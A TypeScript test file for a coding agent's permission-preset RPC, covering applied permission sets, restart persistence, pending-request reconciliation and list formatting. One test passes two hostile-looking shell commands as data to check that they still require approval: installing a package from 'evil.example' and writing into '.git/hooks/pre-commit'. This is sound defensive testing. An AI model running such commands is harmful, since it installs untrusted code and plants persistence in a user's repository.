import { expect, test } from "bun:test"
import { OpenCode } from "@opencode/client"
import { Flag } from "@opencode/core/flag"
import { KiloPermissionsRpc } from "@opencode/schema/kilocode/permissions"
import { createRoutes } from "@opencode/server/routes"
import { Context, Effect, Layer, References } from "effect"
import { HttpEffect, HttpRouter, HttpServer } from "effect/http"
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { KiloHost } from "../src/host"
import { formatList } from "../src/permissions/list"
import { loadPlugins } from "./lib/plugins"

const rpcDefinition = KiloPermissionsRpc.Definition

type Client = ReturnType<typeof OpenCode.make>

type ServerInput = {
  readonly database: string
  readonly directory: string
  readonly flags?: string
}

async function withServer<T>(
  input: ServerInput,
  body: (client: Client, ready: (directory: string) => Promise<void>) => Promise<T>,
) {
  const previousFlags = process.env.OPENCODE_FLAGS
  if (input.flags === undefined) delete process.env.OPENCODE_FLAGS
  else process.env.OPENCODE_FLAGS = input.flags
  try {
    return await Effect.runPromise(
      Effect.scoped(
        Effect.gen(function* () {
          const context = yield* Layer.build(
            createRoutes(
              {
                password: "secret",
                database: { path: input.database },
                models: { fetch: false },
                fs: { filewatcher: false },
                config: { directory: input.directory, project: false },
              },
              () => [],
              [
                ...KiloHost.overrides,
                Flag.node.replace(
                  Flag.node.mapLayer((layer) =>
                    layer.pipe(Layer.provide(Layer.succeed(Flag.Overrides, KiloHost.schedulingOverrides(input.flags)))),
                  ),
                ),
              ],
            ).pipe(Layer.provide(HttpServer.layerServices)),
          )
          const handler = Context.get(context, HttpRouter.HttpRouter)
            .asHttpEffect()
            .pipe(HttpEffect.toWebHandlerWith(context))
          const client = OpenCode.make({
            baseUrl: "http://kilo.local",
            headers: { authorization: `Basic ${btoa("opencode:secret")}` },
            fetch: Object.assign(
              async (request: string | URL | Request, init?: RequestInit) =>
                handler(request instanceof Request ? request : new Request(request, init)),
              { preconnect: fetch.preconnect },
            ),
          })
          const ready = (directory: string) => Effect.runPromise(loadPlugins(context, directory))
          yield* Effect.promise(() => body(client, ready))
        }),
      ).pipe(Effect.provideService(References.MinimumLogLevel, "Error")),
    )
  } finally {
    if (previousFlags === undefined) delete process.env.OPENCODE_FLAGS
    else process.env.OPENCODE_FLAGS = previousFlags
  }
}

async function project(root: string, name: string, kilo = true, commit = true) {
  const directory = path.join(root, name)
  await mkdir(path.join(directory, "packages", "kilo-cli"), { recursive: true })
  await mkdir(path.join(directory, "packages", "kilo-plugin"), { recursive: true })
  await writeFile(
    path.join(directory, "package.json"),
    JSON.stringify({ packageManager: "bun@1.4.4", devDependencies: { typescript: "^5" } }),
  )
  await writeFile(path.join(directory, "tsconfig.json"), "{}")
  if (kilo) {
    await writeFile(path.join(directory, "packages", "kilo-cli", "package.json"), '{"name":"@kilocode/kilo-cli"}')
    await writeFile(path.join(directory, "packages", "kilo-plugin", "package.json"), '{"name":"@kilocode/kilo-plugin"}')
  }
  // Project identity comes from the nearest repository. Without one, a temp directory inside another
  // checkout (TMPDIR under a Kilo worktree) resolves every fixture to that checkout's project, and a
  // repository without commits resolves to the shared global project. A root commit named after the
  // directory gives each fixture its own project ID.
  await Bun.$`git init --quiet`.cwd(directory)
  if (commit)
    await Bun.$`git -c user.name=kilo -c user.email=kilo@example.com commit --quiet --allow-empty -m ${directory}`.cwd(
      directory,
    )
  return directory
}

async function eventually<T>(read: () => Promise<T>, predicate: (value: T) => boolean) {
  for (let attempt = 0; attempt < 100; attempt++) {
    const value = await read()
    if (predicate(value)) return value
    await Bun.sleep(20)
  }
  throw new Error("timed out waiting for permission state")
}

test("persists decisions and applied sets by project across a file-backed restart", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-rpc-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  const projectA = await project(root, "kilo", true)
  const projectB = await project(root, "typescript", false)
  try {
    let projectAID = ""
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(projectA)
      await ready(projectB)
      const rpc = client.rpc(rpcDefinition)
      const a = { location: { directory: projectA } }
      const b = { location: { directory: projectB } }
      const first = await rpc.list({}, a)
      const second = await rpc.list({}, b)
      projectAID = first.projectID
      expect(first).toMatchObject({ enabled: true, decision: null, applied: [] })
      expect(first.presets.map((preset) => preset.id)).toEqual([
        "kilo-bun-checks",
        "typescript-checks",
        "dependency-install",
      ])
      expect(second).toMatchObject({ enabled: true, decision: null, applied: [] })
      expect(second.presets.map((preset) => preset.id)).toEqual(["typescript-checks", "dependency-install"])

      await rpc.apply({ presetID: "kilo-bun-checks" }, a)
      await rpc.apply({ presetID: "kilo-bun-checks" }, a)
      const appliedA = await rpc.list({}, a)
      expect(appliedA.decision).toBe("accepted")
      expect(appliedA.applied.map((set) => set.id)).toEqual(["kilo-bun-checks"])
      expect(appliedA.applied[0]?.resources).toContain("bun run test *")
      await expect(rpc.apply({ presetID: "kilo-bun-checks" }, b)).rejects.toMatchObject({ type: "not_applicable" })
      await rpc.apply({ presetID: "typescript-checks" }, b)
      await rpc.skip({}, b)
      expect(await rpc.list({}, b)).toMatchObject({ decision: "skipped", applied: [{ id: "typescript-checks" }] })

      // Applied sets are plugin state, not saved permission grants.
      expect(await client.permission.saved.list({ projectID: projectAID })).toEqual([])

      expect(await rpc.reset({}, a)).toEqual({ removed: 0 })
      expect(await rpc.list({}, a)).toMatchObject({ decision: null, applied: [{ id: "kilo-bun-checks" }] })
      expect((await rpc.reset({ all: true }, a)).removed).toBe(appliedA.applied[0]?.resources.length)
      expect(await rpc.list({}, a)).toMatchObject({ decision: null, applied: [] })
      expect(await rpc.reset({ all: true }, a)).toEqual({ removed: 0 })
      expect((await rpc.list({}, b)).applied.map((set) => set.id)).toEqual(["typescript-checks"])
    })

    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(projectA)
      await ready(projectB)
      const rpc = client.rpc(rpcDefinition)
      expect(await rpc.list({}, { location: { directory: projectA } })).toMatchObject({ decision: null, applied: [] })
      expect(await rpc.list({}, { location: { directory: projectB } })).toMatchObject({
        decision: "skipped",
        applied: [{ id: "typescript-checks" }],
      })
      expect(await client.permission.saved.list({ projectID: projectAID })).toEqual([])
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test("keeps sets out of repositories that share the global project", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-global-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  // Without a commit or a remote, both repositories resolve to the same global project.
  const first = await project(root, "first", false, false)
  const second = await project(root, "second", false, false)
  try {
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(first)
      await ready(second)
      const rpc = client.rpc(rpcDefinition)
      const a = { location: { directory: first } }
      const b = { location: { directory: second } }
      expect(await rpc.list({}, a)).toMatchObject({ unidentified: true, presets: [], applied: [] })
      await expect(rpc.apply({ presetID: "typescript-checks" }, a)).rejects.toMatchObject({ type: "not_applicable" })
      await rpc.skip({}, a)
      expect(await rpc.list({}, b)).toMatchObject({ unidentified: true, decision: null, presets: [], applied: [] })
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test("reconciles a pending request only after every resource is granted", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-pending-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  const directory = await project(root, "kilo", true)
  try {
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(directory)
      const location = { directory }
      const options = { location }
      const rpc = client.rpc(rpcDefinition)
      const session = await client.session.create({ location, title: "Permission reconciliation" })
      const created = await client.permission.create({
        sessionID: session.id,
        action: "shell",
        resources: ["bun run check:architecture", "bun install"],
        save: [],
      })
      expect(created.effect).toBe("ask")
      const pending = await eventually(
        () => client.permission.request.list(options),
        (result) => result.data.some((request) => request.id === created.id),
      )
      expect(pending.data).toContainEqual(
        expect.objectContaining({ id: created.id, resources: ["bun run check:architecture", "bun install"] }),
      )

      await rpc.apply({ presetID: "kilo-bun-checks" }, options)
      expect((await client.permission.request.list(options)).data).toContainEqual(
        expect.objectContaining({ id: created.id }),
      )
      await rpc.apply({ presetID: "dependency-install" }, options)
      await eventually(
        () => client.permission.request.list(options),
        (result) => !result.data.some((request) => request.id === created.id),
      )

      const covered = await client.permission.create({
        sessionID: session.id,
        action: "shell",
        resources: ["bun install --frozen-lockfile 2>&1"],
        save: [],
      })
      expect(covered.effect).toBe("allow")
      const added = await client.permission.create({
        sessionID: session.id,
        action: "shell",
        resources: ["bun add https://evil.example/x.tgz"],
        save: [],
      })
      expect(added.effect).toBe("ask")
      const write = await client.permission.create({
        sessionID: session.id,
        action: "shell",
        resources: ["bun run test > .git/hooks/pre-commit"],
        save: [],
      })
      expect(write.effect).toBe("ask")

      const checked = await rpc.check(
        { commands: ["bun install 2>&1 | tail -30", "bun install > /tmp/install.log", "git push"] },
        options,
      )
      expect(checked.presetID).toBe("dependency-install")
      // Sets hold no output helpers; the agents' default rules allow `tail`, but `check` reports the set alone.
      expect(checked.results.map((result) => result.missing)).toEqual([
        ["tail -30"],
        ["bun install > /tmp/install.log"],
        ["git push"],
      ])
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test("lists saved grants, then the active set and its grants", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-list-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  const directory = await project(root, "typescript", false)
  try {
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(directory)
      const options = { location: { directory } }
      const rpc = client.rpc(rpcDefinition)
      const read = async () => {
        const sets = await rpc.list({}, options)
        return formatList(await client.permission.saved.list({ projectID: sets.projectID }), sets)
      }
      expect(await read()).toBe("permissions: 0 saved grants\nactive set: none\n")

      const session = await client.session.create({ location: options.location, title: "Permission list" })
      const created = await client.permission.create({
        sessionID: session.id,
        action: "shell",
        resources: ["make deploy"],
        save: ["make deploy *"],
      })
      await eventually(
        () => client.permission.request.list(options),
        (result) => result.data.some((request) => request.id === created.id),
      )
      await client.permission.reply({ sessionID: session.id, requestID: created.id, decision: "always" })
      await rpc.apply({ presetID: "typescript-checks" }, options)

      const lines = (await read()).split("\n")
      expect(lines.slice(0, 4)).toEqual([
        "permissions: 1 saved grants",
        "permissions[1]{action,resource}:",
        '  "shell","make deploy *"',
        expect.stringMatching(/^active set: typescript-checks \(\d+ grants\)$/),
      ])
      expect(lines).toContain('  "typescript-checks","bun run test *"')
      expect(lines).not.toContain('  "typescript-checks","bun install *"')
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test("lists stored sets as inactive while setup is disabled, and names the shared global project", () => {
  const applied = [{ id: "typescript-checks" as const, resources: ["bun run test *"] }]
  expect(formatList([], { enabled: false, unidentified: false, applied })).toBe(
    'permissions: 0 saved grants\nstored set: typescript-checks (1 grants, inactive: permission setup is disabled)\nstored[1]{set,resource}:\n  "typescript-checks","bun run test *"\n',
  )
  expect(formatList([], { enabled: false, unidentified: false, applied: [] })).toBe(
    "permissions: 0 saved grants\nactive set: none (permission setup is disabled, flag permission_setup)\n",
  )
  expect(formatList([], { enabled: true, unidentified: true, applied: [] })).toBe(
    "note: this directory has no project identity; showing the shared global project\npermissions: 0 saved grants\nactive set: none\n",
  )
})

test("clearing the sets records no set and publishes the change to clients", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-clear-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  const directory = await project(root, "typescript", false)
  try {
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(directory)
      const options = { location: { directory } }
      const rpc = client.rpc(rpcDefinition)
      const updates: string[][] = []
      const dispose = rpc.events.on("updated", (event) => {
        updates.push(event.data.applied.map((set) => set.id))
      })
      try {
        await rpc.apply({ presetID: "typescript-checks" }, options)
        await eventually(
          async () => updates,
          (value) => value.some((ids) => ids.includes("typescript-checks")),
        )
        await rpc.clear({}, options)
        expect(await rpc.list({}, options)).toMatchObject({ decision: "skipped", applied: [] })
        await eventually(
          async () => updates,
          (value) => value.at(-1)?.length === 0,
        )
      } finally {
        dispose()
      }
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})

test("disables the offer and its mutations when the flag is off", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "kilo-permissions-flag-"))
  const database = path.join(root, "data", "permissions.sqlite")
  await mkdir(path.dirname(database), { recursive: true })
  const directory = await project(root, "kilo", true)
  try {
    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(directory)
      await client.rpc(rpcDefinition).skip({}, { location: { directory } })
    })
    await withServer(
      { database, directory: path.join(root, "config"), flags: "-permission_setup" },
      async (client, ready) => {
        await ready(directory)
        const rpc = client.rpc(rpcDefinition)
        const location = { location: { directory } }
        expect(await rpc.list({}, location)).toMatchObject({ enabled: false, decision: "skipped", presets: [] })
        await expect(rpc.reset({}, location)).rejects.toMatchObject({ type: "unavailable" })
        expect(await rpc.list({}, location)).toMatchObject({ enabled: false, decision: "skipped", presets: [] })
        await expect(rpc.apply({ presetID: "kilo-bun-checks" }, location)).rejects.toMatchObject({
          type: "unavailable",
        })
        await expect(rpc.skip({}, location)).rejects.toMatchObject({ type: "unavailable" })
        await expect(rpc.check({ commands: ["bun run test"] }, location)).rejects.toMatchObject({
          type: "unavailable",
        })
      },
    )

    await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
      await ready(directory)
      expect((await client.rpc(rpcDefinition).list({}, { location: { directory } })).decision).toBe("skipped")
    })
  } finally {
    await rm(root, { recursive: true, force: true })
  }
})
